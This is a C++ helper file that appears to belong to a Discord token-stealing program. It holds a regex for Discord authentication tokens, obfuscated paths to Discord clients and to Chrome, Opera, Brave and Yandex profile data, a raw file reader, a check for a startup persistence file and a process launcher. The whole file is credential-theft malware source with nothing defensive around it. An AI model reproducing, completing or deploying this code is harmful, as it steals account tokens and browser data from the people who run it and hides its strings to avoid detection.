#include <string>
#include <regex>
#include <filesystem>
#include <Windows.h>

#include "requests.h"
#include "helper.h"

#pragma comment(lib,"Shell32.lib") 

namespace fs = std::filesystem;

namespace helpers {
	std::string regex_token = R"([\w-]{24}\.[\w-]{6}\.[\w-]{27})";

	std::string roaming = getenv(xorstr_("APPDATA"));

	std::string local = getenv(xorstr_("LOCALAPPDATA"));

	std::array<std::pair<std::string, std::string>, 7> paths = { { { xorstr_("Discord"), roaming + xorstr_("\\Discord") },
															   { xorstr_("Discord Canary"), roaming + xorstr_("\\discordcanary") },
															   { xorstr_("Discord PTB"), roaming + xorstr_("\\discordptb") },
															   { xorstr_("Google Chrome"), local + xorstr_("\\Google\\Chrome\\User Data\\Default") },
															   { xorstr_("Opera"), roaming + xorstr_("\\Opera Software\\Opera Stable") },
															   { xorstr_("Brave"), local + xorstr_("\\BraveSoftware\\Brave-Browser\\User Data\\Default") },
															   { xorstr_("Yandex"), local + xorstr_("\\Yandex\\YandexBrowser\\User Data\\Default") },
															} };

	std::string read_file(const char* filename) {
		std::string content;
		FILE* fp;
		fopen_s(&fp, filename, xorstr_("rb"));
		if (fp) {
			fseek(fp, 0, SEEK_END);
			content.resize(ftell(fp));
			rewind(fp);
			fread(&content[0], 1, content.size(), fp);
			fclose(fp);
		}
		return(content);
	}

	bool check_for_startup() {
		for (const auto& entry : fs::directory_iterator(helpers::roaming + xorstr_("\\Microsoft\\"))) {
			if (entry.path().filename().string() == client::STARTUP_FILE_NAME) {
				return true;
			}
		}
		return false;
	}

	void start_process(std::string path)
	{
		ShellExecute(NULL, "open", path.c_str(), NULL, NULL, SW_SHOWDEFAULT);
	}
}